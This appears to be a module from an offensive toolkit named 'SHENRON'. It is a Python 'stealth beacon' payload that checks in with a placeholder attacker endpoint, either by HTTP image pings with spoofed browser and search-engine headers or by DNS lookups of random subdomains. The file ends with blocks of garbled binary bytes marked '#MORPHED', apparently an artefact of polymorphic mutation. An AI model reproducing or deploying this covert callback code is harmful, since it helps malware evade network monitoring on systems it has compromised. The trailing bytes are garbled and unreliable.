from core.engine.payload_registry import register_payload

#!/usr/bin/env python3
# beacon_emitter_cloak.py - SHENRON stealth beacon callback emitter

import requests
import socket
import base64
import os
import time
import random

BEACON_URL = "https://your-cloaked-endpoint.example.com/beacon.gif"
FAKE_HEADERS = [
    {"User-Agent": "Mozilla/5.0", "Referer": "https://google.com"},
    {"User-Agent": "curl/7.88.1", "Referer": "https://bing.com"},
    {"User-Agent": "Wget/1.20.3", "Referer": "https://duckduckgo.com"}
]

def emit_image_ping():
    try:
        headers = random.choice(FAKE_HEADERS)
        unique_id = base64.urlsafe_b64encode(os.urandom(8)).decode().rstrip("=")
        payload = {"id": unique_id, "ts": str(int(time.time()))}
        r = requests.get(BEACON_URL, headers=headers, params=payload, timeout=3)
        print(f"[âœ“] Beacon pinged: {r.status_code} ({unique_id})")
    except Exception as e:
        print(f"[!] Beacon failed: {e}")

def emit_dns_noise():
    try:
        random_sub = base64.urlsafe_b64encode(os.urandom(6)).decode().rstrip("=")
        dns_target = f"{random_sub}.track.domain.example.com"
        socket.gethostbyname(dns_target)
        print(f"[âœ“] DNS beacon: {dns_target}")
    except:
        print("[!] DNS beacon blocked or failed.")

@register_payload(name="beacon_emitter_cloak_L3b1m8_DuguqB")
def main():
    method = random.choice(["img", "dns"])
    if method == "img":
        emit_image_ping()
    else:
        emit_dns_noise()

if __name__ == "__main__":
    main()

£¸Ÿ2eñ«íêv#MORPHED

)“™	Öæ£·‚ÈU~‡h{U:äPµÄ#ºpÃB­…ùzC%	l)F5«ô­¨#MORPHED
